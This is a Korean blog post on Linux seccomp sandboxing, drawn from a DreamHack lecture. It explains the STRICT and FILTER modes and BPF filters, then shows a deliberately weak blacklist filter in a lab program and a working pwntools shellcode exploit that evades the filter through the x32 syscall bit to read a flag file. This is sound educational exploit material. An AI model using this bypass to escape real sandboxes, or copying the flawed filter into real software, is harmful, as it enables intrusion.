---
title: "SECCOMP Filter Bypass"
date: 2022-03-15 +0900
author: J0ngBae
categories: [Hacking, Pwn]
tags: ['system hacking', 'seccomp', '2022']
---
## SECCOMP

> SECure COMPuting mode(SECCOMP)은 리눅스 커널에서 프로그램의 샌드박싱 매커니즘을 제공하는 컴퓨터 보안 기능이다. 샌드박스는 시스템 오류나 취약점으로 인한 2차 피해를 막기 위해 프로그램의 권한을 분리하기 위한 보안 매커니즘이다.
{: .prompt-tip }

- seccomp를 이용하면 프로세스가 필요로 하지 않지만 위험한 시스템 콜들에 대한 호출을 막을 수 있다.
- ex. `execve` 시스템 콜을 필터링 했을 때, 프로세스에서 `execve` 시스템 콜이 호출되면 프로그램이 즉시 종료된다.
- 이는 `prctl` 함수의 인자로 `PR_SET_SECCOMP` 를 전달할 경우 seccomp를 활성화할 수 있다.

`PR_SET_SECCOMP` 의 모드는 다음과 같이 두 가지의 모드가 존재한다.

```c
int __secure_computing(const struct seccomp_data *sd)
{
        int mode = current->seccomp.mode;
        int this_syscall;
        ...
        this_syscall = sd ? sd->nr :
                syscall_get_nr(current, task_pt_regs(current));
        switch (mode) {
        case SECCOMP_MODE_STRICT:
                __secure_computing_strict(this_syscall);  /* may call do_exit */
                return 0;
        case SECCOMP_MODE_FILTER:
                return __seccomp_filter(this_syscall, sd, false);
        ...
        }
}
```

- STRICT_MODE
    
    해당 모드는 `read`, `write` , `exit`, `sigreturn` 시스템 콜의 호출만을 허용하여 이외의 시스템 콜의 호출 요청이 들어오면 SIGKILL 시그널을 발생하고 프로그램을 종료한다.
    

- FILTER_MODE
    
    해당 모드는 원하는 시스템 콜의 호출을 허용하거나 허용하지 않을 수 있다. 해당 모드를 사용하면 `prctl` 의 세 번째 인자로 전달되는 구조체인 `sock_fprog` 에 대해서 이해하고 있어야 된다.
    
    ```c
    struct sock_fprog {     /* Required for SO_ATTACH_FILTER. */
        unsigned short len;    /* Number of filter blocks */
        struct sock_filter __user *filter;
    };
    struct sock_filter {
        __u16 code; // actual filter code
        __u8  jt; // jump true
        __u8  jf; // jump false
        __u32 k; // generic multiuse field
    }
    ```
    
    `len` 변수는 `filter` 구조체 블럭의 개수를 지정할 수 있고, `sock_filter` 구조체는 특정 경우에 분기문을 설정할 수 있다. 그리고 특정 시스템 콜이 호출될 때 다음과 같은 동작을 수행할 수 있다.
    
    필터링을 적용할 때 사용되는 것이 Berkeley Packet Filter(BPF)이다. BPF는 네트워크 패킷을 필터링하기 위해 만들어진 필터링 매커니즘으로, seccomp를 사용할 때도 이를 사용하여 원하는 필터를 작성할 수 있다.
    
    - STRICT_MODE
        
        ```c
        static int mode1_syscalls[] = {
            __NR_seccomp_read, __NR_seccomp_write, __NR_seccomp_exit, __NR_seccomp_sigreturn,
            0, /* null terminated */
        };
        #ifdef CONFIG_COMPAT
        static int mode1_syscalls_32[] = {
            __NR_seccomp_read_32, __NR_seccomp_write_32, __NR_seccomp_exit_32, __NR_seccomp_sigreturn_32,
            0, /* null terminated */
        };
        #endif
        int __secure_computing(int this_syscall)
        {
            int mode = current->seccomp.mode;
            int exit_sig = 0;
            int *syscall;
            u32 ret;
            switch (mode) {
            case SECCOMP_MODE_STRICT:
                syscall = mode1_syscalls;
        #ifdef CONFIG_COMPAT
                if (is_compat_task())
                syscall = mode1_syscalls_32;
        #endif
                do {
                    if (*syscall == this_syscall)
                        return 0;
                } while (*++syscall);
                exit_sig = SIGKILL;
                ret = SECCOMP_RET_KILL;
                break;
                ...
        }
        ```
        
    - FILTER_MODE
        
        ```c
        int __secure_computing(int this_syscall)
        {
            int mode = current->seccomp.mode;
            int exit_sig = 0;
            int *syscall;
            u32 ret;
            switch (mode) {
            case SECCOMP_MODE_FILTER: {
                int data;
                ret = seccomp_run_filters(this_syscall);
                data = ret & SECCOMP_RET_DATA;
                ret &= SECCOMP_RET_ACTION;
                switch (ret) {
                    case SECCOMP_RET_ERRNO:
                        ...
                    case SECCOMP_RET_TRAP:
                        ...
                    case SECCOMP_RET_TRACE:
                        ...
                        return 0;
                    case SECCOMP_RET_ALLOW:
                        return 0;
                    case SECCOMP_RET_KILL:
                    default:
                        break;
            }
        ```
        
    
## Seccomp Filter Bypass


`seccomp.c` 는 seccomp를 사용하여 `sigreturn` , `open` , `openat`, `execve`, `execveat` 시스템 콜을 필터링 하는 예제이다.

- `seccomp.c`
    
    ```c
    // gcc -o seccomp seccomp.c
    #include <stdio.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stddef.h>
    #include <sys/prctl.h>
    #include <linux/seccomp.h>
    #include <linux/filter.h>
    #include <linux/unistd.h>
    #include <linux/audit.h>
    #include <sys/mman.h>
    int syscall_filter() {
        #define syscall_nr (offsetof(struct seccomp_data, nr))
        #define arch_nr (offsetof(struct seccomp_data, arch))
        
        /* architecture x86_64 */
        #define REG_SYSCALL REG_RAX
        #define ARCH_NR AUDIT_ARCH_X86_64
        struct sock_filter filter[] = {
            /* Validate architecture. */
            BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
            BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
            BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
            /* Get system call number. */
            BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
            /* List allowed syscalls. */
            BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_rt_sigreturn, 0, 5),
            BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_open, 0, 4),
                    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_openat, 0, 3),
            BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_execve, 0, 2),
            BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_execveat, 0, 1),
            BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
            BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
            };
        
        struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
        .filter = filter,
            };
        if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
            perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
            return -1;
            }
        
        if ( prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) == -1 ) {
            perror("Seccomp filter error\n");
            return -1;
            }
        return 0;
    }
    int main(int argc, char* argv[])
    {
        void (*sc)();
        unsigned char *shellcode;
        shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        read(0, shellcode, 1024);
        syscall_filter();
        sc = (void *)shellcode;
        sc();
        return 0;
    }
    ```
    

다음은 seccomp 필터링 선언부의 일부이다.

```c
BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
/* List allowed syscalls. */
BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_rt_sigreturn, 0, 5),
BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_open, 0, 4),
BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_openat, 0, 3),
BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_execve, 0, 2),
BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_execveat, 0, 1),
BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
```

시스템 콜이 호출되면 `BPF_JEQ` 조건문을 통해 호출한 시스템 콜이 `rt_sigreturn`, `open` , `openat`, `execve`, `execveat` 인지 확인하고, 다르다면 해당 `SECCOMP_RET_ALLOW` 로 분기한다.

이 예제는 블랙리스트 기반의 필터링 방법을 사용했다. 이와 반대로 seccomp를 이용해 화이트리스트 기반으로 필터링 하는 방법 또한 존재한다.

`seccomp.c` 의 `main` 함수는 seccomp 필터링을 설정한 후 사용자로부터 입력받은 기계어 코드를 실행한다. 사용자는 임의의 코드를 실행할 수 있지만 일반적인 방법으로는 필터링된 시스템 콜은 호출할 수 없다.

```python
#seccomp_test.py

from pwn import *

p = process("./seccomp")

payload = asm("mov eax, 2")
payload += asm("syscall")

p.sendline(payload)
p.interactive()
```

`seccomp_test.py` 는 `eax` 레지스터에 `open` 시스템 콜의 번호인 2를 넣고 `syscall` 명령어를 호출하여 `open` 시스템 콜을 실행하는 코드이다.

다음은 `seccomp_test.py` 를 실행한 결과이다.

```bash
[+] Starting local process './seccomp': pid 68110
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
[*] Process './seccomp' stopped with exit code -31 (SIGSYS) (pid 68110)
[*] Got EOF while sending in interactive
```

seccomp 필터로 인해 `open` 시스템 콜이 호출되면서 SIGSYS 시그널이 발생해 비정상 종료한 것을 확인할 수 있다.

`do_syscall_64` 함수를 보면 시스콜 번호를 나타내는 `unsigned long` 타입의 `nr` 변수가 `sys_call_table` 배열의 인덱스로 사용된다. 만약 `nr & 0x40000000` 의 결과가 0이 아니라면 `nr & ~__X32_SYSCALL_BIT` 연산을 통해 nr의 31번째 비트를 0으로 만든다.

```bash
>>> hex(0x40001234 & ~0x40000000)
'0x1234'
```

`seccomp.c` 의 seccomp 필터에서는 이러한 시스템 콜 번호의 예외 경우에 대한 검증을 하지 않기 때문에 `0x40000000` 과 or 연산을 통해 원하는 시스템 콜 번호를 삽입하면 필터링을 우회할 수 있게 된다.

- do_syscall_64
    
    ```bash
    #define __X32_SYSCALL_BIT	0x40000000UL
    // common.c 
    __visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
    {
        struct thread_info *ti;
        enter_from_user_mode();
        local_irq_enable();
        ti = current_thread_info();
        if (READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY)
        nr = syscall_trace_enter(regs);
        if (likely(nr < NR_syscalls)) {
        nr = array_index_nospec(nr, NR_syscalls);
        regs->ax = sys_call_table[nr](regs);
    #ifdef CONFIG_X86_X32_ABI
        } else if (likely((nr & __X32_SYSCALL_BIT) &&
            (nr & __X32_SYSCALL_BIT) < X32_NR_syscalls)) {
        nr = array_index_nospec(nr & ~__X32_SYSCALL_BIT,
                X32_NR_syscalls);
        regs->ax = x32_sys_call_table[nr](regs);
    #endif
        }
        syscall_return_slowpath(regs);
    }
    ```
    

`seccomp.py` 는 필터링된 시스템 콜 번호를 `0x40000000` 값과의  or 연산을 통해 우회하였다.

`seccomp.py` 를 실행해 보면 `open`, `read`, `write` 시스템 콜을 통해 flag 파일을 읽어서 출력시키는 것을 확인할 수 있다.

```python
#seccomp.py
from pwn import *
p = process("./seccomp")
context.arch = 'x86_64'
# open("flag","r")
payload = asm("mov eax, 0x40000000")
payload += asm("or eax, 2")
payload += asm("mov rdi, 0x67616c66")
payload += asm("push rdi")
payload += asm("mov rdi, rsp")
payload += asm("mov rsi, 0")
payload += asm("syscall")
# read(fd, rsp, 0xff);
payload += asm("mov rdi, rax") # open file fd
payload += asm("mov eax, 0x40000000")
payload += asm("or eax, 0")
payload += asm("mov rsi, rsp")
payload += asm("mov edx, 0xff") 
payload += asm("syscall")
# write(1, rsp, 0xff);
payload += asm("mov rdi, 1") # stdout 1 
payload += asm("mov eax, 0x40000000")
payload += asm("or eax, 1")
payload += asm("mov rsi, rsp")
payload += asm("mov edx, 0xff") 
payload += asm("syscall")
p.sendline(payload)
p.interactive()
```

> DreamHack SECCOMP Filter Bypass - <https://dreamhack.io/lecture/courses/263>